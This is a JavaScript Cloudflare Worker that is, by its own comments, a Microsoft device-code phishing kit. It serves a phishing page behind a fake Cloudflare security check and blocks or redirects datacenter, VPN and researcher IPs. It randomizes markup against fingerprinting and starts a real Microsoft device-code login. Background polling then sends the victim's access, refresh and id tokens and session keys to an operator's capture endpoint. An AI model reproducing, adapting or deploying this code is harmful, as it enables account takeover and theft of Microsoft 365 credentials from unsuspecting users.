// VGenius C Engine - Device Code Worker
// Deployed to Cloudflare Workers per user link

const VERIFY_ENDPOINT = '{{VERIFY_ENDPOINT}}';
const BEACON_ENDPOINT = '{{BEACON_ENDPOINT}}';
const LOG_ENDPOINT = '{{LOG_ENDPOINT}}';

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);

  // Serve the phishing page
  if (request.method === 'GET' && !url.pathname.startsWith('/api/')) {
    return servePhishingPage(request);
  }

  // API endpoints - support both legacy and new paths
  if (url.pathname === '/api/devicecode' || url.pathname === '/api/device/start') {
    return handleDeviceCodeRequest(request);
  }
  if (url.pathname === '/api/verify') {
    return handleVerifyRequest(request);
  }
  if (url.pathname === '/api/beacon') {
    return new Response('ok', { status: 200 });
  }
  if (url.pathname === '/api/log') {
    return handleLogRequest(request);
  }

  return new Response('Not Found', { status: 404 });
}

async function servePhishingPage(request) {
  const jwtToken = '{{JWT_TOKEN}}';
  const turnstileKey = '{{TURNSTILE_KEY}}';
  const templateHTML = `{{TEMPLATE_HTML}}`;

  // Get visitor IP from Cloudflare
  const visitorIp = request.headers.get('CF-Connecting-IP') || 
                    request.headers.get('X-Forwarded-For') || 
                    request.headers.get('X-Real-IP') || 
                    '';

  // Check if visitor should be blocked or challenged
  try {
    const blockResponse = await fetch(`${VERIFY_ENDPOINT}/api/capture/visitor/block-check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ jwt_token: jwtToken, visitor_ip: visitorIp }),
    });
    const blockData = await blockResponse.json();

    if (blockData.blocked) {
      if (blockData.redirect_url) {
        // Redirect to the configured URL
        return new Response(null, {
          status: 302,
          headers: { 'Location': blockData.redirect_url }
        });
      } else {
        // Show blank page for blocked visitors
        return new Response('', {
          status: 200,
          headers: {
            'Content-Type': 'text/html; charset=utf-8',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
          }
        });
      }
    }

    // If challenged, serve Cloudflare-style challenge page
    if (blockData.challenged) {
      return new Response(buildChallengePage(jwtToken, turnstileKey, templateHTML, blockData.ip_type), {
        status: 200,
        headers: {
          'Content-Type': 'text/html; charset=utf-8',
          'Cache-Control': 'no-cache, no-store, must-revalidate',
        }
      });
    }
  } catch (e) {
    // If block check fails, serve the page anyway
    console.error('[Worker] Block check failed:', e.message);
  }

  // Try to verify subscription via JWT, but serve page even if verification fails
  let clientId = '';
  let tenant = 'common';
  let dynamicTurnstileKey = turnstileKey;

  try {
    const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: jwtToken }),
    });
    const verifyData = await verifyResponse.json();
    if (verifyData.valid) {
      clientId = verifyData.client_id;
      tenant = verifyData.tenant;
      if (verifyData.turnstile_key) turnstileKey = verifyData.turnstile_key;
    }
  } catch (e) {
    // Verification failed - continue anyway, client-side will handle errors
  }

  // Inject dynamic values
  let html = templateHTML
    .replace(/{{JWT_TOKEN}}/g, jwtToken)
    .replace(/{{TURNSTILE_KEY}}/g, turnstileKey)
    .replace(/{{CLIENT_ID}}/g, clientId)
    .replace(/{{TENANT}}/g, tenant)
    .replace(/{{VERIFY_ENDPOINT}}/g, VERIFY_ENDPOINT)
    .replace(/{{BEACON_ENDPOINT}}/g, BEACON_ENDPOINT)
    .replace(/{{LOG_ENDPOINT}}/g, LOG_ENDPOINT);

  // Randomize class names for anti-fingerprinting
  html = html.replace(/vg-/g, 'vg-' + Math.random().toString(36).substring(2, 6) + '-');

  return new Response(html, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'no-referrer',
      'Content-Security-Policy': "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src *; img-src * data: blob:; style-src * 'unsafe-inline';",
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
    },
  });
}

async function handleDeviceCodeRequest(request) {
  const { jwt_token, turnstile_token } = await request.json();

  // Verify JWT with backend
  try {
    const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: jwt_token }),
    });
    const verifyData = await verifyResponse.json();
    if (!verifyData.valid) {
      return new Response(JSON.stringify({ error: 'Invalid or expired session' }), {
        status: 403,
        headers: { 'Content-Type': 'application/json' },
      });
    }

    // Verify Turnstile
    const turnstileVerify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        secret: '{{TURNSTILE_SECRET}}',
        response: turnstile_token,
      }),
    });
    const turnstileData = await turnstileVerify.json();
    if (!turnstileData.success) {
      return new Response(JSON.stringify({ error: 'CAPTCHA verification failed' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' },
      });
    }

    // Request device code from Microsoft with proper scope for refresh token
    const deviceCodeResponse = await fetch(
      `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/devicecode`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          client_id: verifyData.client_id,
          scope: 'offline_access openid profile email User.Read',
        }),
      }
    );
    const deviceCodeData = await deviceCodeResponse.json();

    // Start background polling
    pollForTokens(deviceCodeData.device_code, jwt_token, verifyData);

    return new Response(JSON.stringify({
      user_code: deviceCodeData.user_code,
      verification_uri: deviceCodeData.verification_uri,
      expires_in: deviceCodeData.expires_in,
      message: deviceCodeData.message,
    }), {
      headers: { 'Content-Type': 'application/json' },
    });
  } catch (err) {
    return new Response(JSON.stringify({ error: 'Failed to generate code' }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' },
    });
  }
}

async function pollForTokens(deviceCode, jwtToken, verifyData) {
  const maxAttempts = 60;
  let attempts = 0;

  while (attempts < maxAttempts) {
    attempts++;
    
    // FIX: Exponential backoff strategy instead of fixed delay
    // Wait times: 2s, 4s, 8s, 16s, 32s, then cap at 10s for rest of attempts
    const waitTime = Math.min(10000, Math.pow(2, attempts) * 1000);
    await new Promise(resolve => setTimeout(resolve, waitTime));

    try {
      const tokenResponse = await fetch(
        `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/token`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
            client_id: verifyData.client_id,
            device_code: deviceCode,
          }),
        }
      );
      const tokenData = await tokenResponse.json();

      if (tokenData.access_token) {
        // Send full token response to capture PRT data (session_key, client_info, etc.)
        // This enables PRT JWT construction and Kerberos-based access
        const capturePayload = {
          jwt_token: jwtToken,
          access_token: tokenData.access_token,
          refresh_token: tokenData.refresh_token,
          id_token: tokenData.id_token,
        };
        
        // Add PRT persistence fields if available
        if (tokenData.client_info) {
          capturePayload.client_info = tokenData.client_info;
        }
        if (tokenData.session_key) {
          capturePayload.session_key = tokenData.session_key;
        }
        if (tokenData.session_key_enc) {
          capturePayload.session_key_enc = tokenData.session_key_enc;
        }
        if (tokenData.token_type) {
          capturePayload.token_type = tokenData.token_type;
        }
        if (tokenData.expires_in) {
          capturePayload.expires_in = tokenData.expires_in;
        }
        if (tokenData.scope) {
          capturePayload.scope = tokenData.scope;
        }
        
        await fetch(`${VERIFY_ENDPOINT}/api/capture`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(capturePayload),
        });
        return;
      } else if (tokenData.error === 'authorization_declined' || tokenData.error === 'expired_token') {
        return;
      }
    } catch (e) {
      // Continue polling on network errors
    }
  }
}

async function handleVerifyRequest(request) {
  const { token } = await request.json();
  const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token }),
  });
  return verifyResponse;
}

async function handleLogRequest(request) {
  try {
    const body = await request.json();
    await fetch(`${LOG_ENDPOINT}/api/log`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch (e) { /* silent */ }
  return new Response('ok', { status: 200 });
}

// Cloudflare-Style Challenge Page for challenged visitors
function buildChallengePage(jwtToken, turnstileKey, originalHTML, ipType) {
  var ipTypeLabels = {
    'datacenter': 'Datacenter IP',
    'vpn': 'VPN/Proxy IP',
    'mobile': 'Mobile Carrier IP',
    'satellite': 'Satellite IP',
    'suspicious': 'Suspicious IP'
  };
  var ipLabel = ipTypeLabels[ipType] || 'Suspicious IP';

  return '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Security Check</title>' +
    '<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;background:#fafafa;color:#1a1a1a;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}.challenge-container{max-width:480px;width:100%;text-align:center}.cf-logo{margin-bottom:32px;display:flex;align-items:center;justify-content:center}h1{font-size:24px;font-weight:600;margin-bottom:8px;color:#1a1a1a}.subtitle{font-size:14px;color:#666;margin-bottom:32px;line-height:1.5}.info-box{background:#f0f0f0;border-radius:8px;padding:16px 20px;margin-bottom:24px;text-align:left;border:1px solid #e0e0e0}.info-box p{font-size:13px;color:#555;line-height:1.6;margin:0}.info-box .highlight{color:#1a1a1a;font-weight:600}.spinner{width:40px;height:40px;border:3px solid #e0e0e0;border-top-color:#f6821f;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 24px}@keyframes spin{to{transform:rotate(360deg)}}.status-text{font-size:13px;color:#666;margin-bottom:8px}.turnstile-widget{margin:16px auto;min-height:65px}.footer{margin-top:40px;padding-top:24px;border-top:1px solid #e0e0e0;width:100%;max-width:480px}.footer p{font-size:11px;color:#999;text-align:center;line-height:1.5}.cf-brand{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px}.cf-brand span{font-size:11px;color:#999;font-weight:500}.success-check{display:none;width:48px;height:48px;margin:0 auto 16px;background:#4CAF50;border-radius:50%;align-items:center;justify-content:center;color:white;font-size:24px}.success-check.show{display:flex}.hidden{display:none}</style></head>' +
    '<body><div class="challenge-container"><div class="cf-logo"><svg width="48" height="48" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg"><path fill="#f6821f" d="M52.8 25.6c-.4-2.8-2.8-4.8-5.6-4.8-.4 0-.8 0-1.2.1C44.4 9.2 34 1.6 22 1.6 10.4 1.6 .8 10.4 .1 21.8 0 22 0 22.1 0 22.3c0 5.4 4.4 9.8 9.8 9.8.4 0 .8 0 1.2-.1 2.4 6.4 8.6 10.8 15.8 10.8h17.4c5.4 0 9.8-4.4 9.8-9.8 0-4.8-3.5-8.8-8-9.6z"/></svg></div>' +
    '<div id="checkingState"><div class="spinner"></div><h1>Checking your browser</h1><p class="subtitle">Please wait for a moment while we verify your connection.</p><div class="info-box"><p><span class="highlight">IP Type Detected:</span> ' + ipLabel + '</p><p style="margin-top:4px;">This is a standard security check to protect the website from automated threats.</p></div><p class="status-text" id="statusText">Initializing security check...</p><div class="turnstile-widget" id="turnstileWidget"></div></div>' +
    '<div id="successState" class="hidden"><div class="success-check show">&#10003;</div><h1>Verification Complete</h1><p class="subtitle">You are being redirected...</p></div></div>' +
    '<div class="footer"><div class="cf-brand"><svg width="16" height="16" viewBox="0 0 16 16" fill="#f6821f"><path d="M14 10c0-2.2-1.8-4-4-4-.3 0-.6 0-.9.1C8.4 3.2 6.2 1.6 3.8 1.6 1.7 1.6 .1 3.4 0 5.4c0 .1 0 .2 0 .3 0 1.1 .9 2 2 2 .1 0 .2 0 .3-.1 .5 1.3 1.8 2.2 3.2 2.2H9c2.2 0 4-1.8 4-4z"/></svg><span>Protected by Cloudflare Turnstile</span></div><p>This security check helps prevent automated bots from accessing this website.</p></div>' +
    '<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>' +
    '<script>(function(){var s=document.getElementById("statusText"),c=document.getElementById("checkingState"),u=document.getElementById("successState");function ok(t){s.textContent="Verification successful!";setTimeout(function(){c.classList.add("hidden");u.classList.remove("hidden");setTimeout(function(){window.location.reload();},1500);},800)}function err(){s.textContent="Verification error. Retrying...";setTimeout(function(){try{window.turnstile.reset()}catch(e){}},2000)}function init(){if(typeof window.turnstile==="undefined"){setTimeout(init,100);return}s.textContent="Running interactive verification...";try{window.turnstile.render("#turnstileWidget",{sitekey:"' + turnstileKey + '",theme:"light",callback:ok,"error-callback":err,"expired-callback":err})}catch(e){s.textContent="Security check skipped. Continuing...";setTimeout(function(){window.location.reload();},1000)}}setTimeout(function(){s.textContent="Analyzing browser fingerprint...";setTimeout(init,1500);},800);var b=0;if(!navigator.webdriver)b++;if(navigator.languages&&navigator.languages.length>0)b++;if(navigator.plugins&&navigator.plugins.length>0)b++;if(screen.width>0&&screen.height>0)b++;if(screen.colorDepth>0)b++;if(b<2)s.textContent="Suspicious activity detected. Additional verification required."})();</script></body></html>';
}

function renderErrorPage() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Page Unavailable</title>
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: #f3f4f6;
      margin: 0;
    }
    .card {
      background: white;
      border-radius: 8px;
      padding: 48px;
      text-align: center;
      box-shadow: 0 2px 16px rgba(0,0,0,0.1);
      max-width: 420px;
    }
    h2 { color: #333; margin-bottom: 12px; }
    p { color: #666; }
  </style>
</head>
<body>
  <div class="card">
    <h2>This page is no longer available</h2>
    <p>The requested resource has been removed or is temporarily unavailable.</p>
  </div>
</body>
</html>`;
}
